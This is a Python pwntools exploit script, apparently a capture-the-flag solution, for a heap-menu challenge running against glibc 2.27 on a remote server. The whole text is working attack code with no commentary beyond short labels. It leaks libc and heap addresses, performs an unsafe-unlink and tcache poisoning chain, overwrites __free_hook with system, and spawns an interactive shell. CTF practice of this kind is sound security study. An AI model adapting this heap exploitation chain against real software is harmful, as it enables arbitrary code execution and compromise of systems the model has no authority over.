from pwn import *
context.log_level='debug'

'''
for local :
docker run -p 5000:5000 --privileged $(docker build -q .)

docker run -d --rm -v $PWD:/pwd --cap-add=SYS_PTRACE --security-opt seccomp=unconfined -p 5000:5000 -p 1234:4444 --privileged $(docker build -q .)
'''

def mstr(size, data):
    p.sendlineafter(b'\n\n> ', b'1')
    p.sendlineafter(b'size? ', str(size).encode())
    p.sendafter(b'str? ', data)

def mtok(idx, data):
    p.sendlineafter(b'\n\n> ', b'2')
    p.sendlineafter(b'idx? ', str(idx).encode())
    p.sendafter(b'delim? ', data)

def mdel(idx):
    p.sendlineafter(b'\n\n> ', b'3')
    p.sendafter(b'idx? ', str(idx).encode())

while True:
    try:
        # p = process(['./ld-2.27.so', './chall'], env={'LD_PRELOAD':'./libc-2.27.so'})
        # p = process('./patched')
        # p = process('./chall')
        # p = remote('localhost', 5000)
        p = remote('mc.ax', 32526)
        # lib = ELF("/lib/x86_64-linux-gnu/libc.so.6")
        # rop = ROP("/lib/x86_64-linux-gnu/libc.so.6")
        lib = ELF("./libc-2.27.so")
        rop = ROP("./libc-2.27.so")

        # leak libc_base
        mstr(0x500, b'b') # 0
        mstr(0x500, b'b') # 1
        mdel(0)
        mstr(0x500, b'a') # 0
        mtok(0, b'Z')
        

        libc_base = u64(p.recvn(6) + b'\x00'*2) - 0x61 + 0xa0 - 0x3ebca0 # - 0x21ac80
        mdel(0)
        mdel(1)

        # leak heap_base
        for i in range(3):
            mstr(0x60, b'a'*8)
        
        mdel(1)
        mdel(0)

        mstr(0x60, b'b') # 0
        mtok(0, b'a')

        ptr = u64(p.recvn(6, timeout=0.5).ljust(8, b'\x00'))
        heap_base = ptr & (-1 ^ 0xfff) 
        mdel(0)
        mdel(2)

        # unsafe unlink
        target = heap_base + 0x490
        payload = p64(target+0x10)[:-2] + b'ef'  # fd
        payload += p64(target+0x10)[:-2] + b'gh' # bk
        payload += p64(target)[:-2] + b'ij'
        payload += p64(target)[:-2] + b'kl'
        payload = payload.ljust(0xe0, b'Z')

        payload += p8(0xf0) + b'mnopqrs' # prev_size
        payload += p16(0x3d0) + b'tuvwxy'
        payload = payload.ljust(0x1e0, b'Z')

        mstr(0xe8, b'Z'*0xe8) # 0
        mstr(0x1e0, payload) # 1

        for i in range(2, 2+11):
            mstr(0xe8, b'a') # 2 ~ 12

        for i in reversed(range(2, 2+8)):
            mdel(i) # fill tcache

        mtok(0, b'\x01')

        for c in reversed(b'efghijklmnopqrstuvwxy'):
            mtok(1, p8(c))

        mdel(0)

        # overwrite chunk size
        payload = b'A'*0xe8
        payload += p16(0x5b1) + b'ABCDEF'

        mstr(0x1d0, payload) # 0

        for c in reversed(b'ABCDEF'):
            mtok(0, p8(c))

        mdel(1) # size 0x5b1

        mstr(0xe8, b'A') # 1
        mstr(0xe8, b'A') # 2

        # overwrite tcache fd
        free_hook = libc_base + lib.sym['__free_hook']
        system = libc_base + lib.sym['system']

        payload = b'A'*0x4b8
        payload += p64(0xf1)
        payload += p64(free_hook)

        mstr(0x5a8, payload) # 3
        mstr(0xe8, b'A') # 4

        mstr(0xe8, p64(system)) # 5
        mstr(0x100, b'/bin/sh\x00') # 6

        mdel(6)
        p.sendline(b'id')
        p.interactive()
        p.close()

    except Exception as e:
        print(e)
        p.close()
        continue


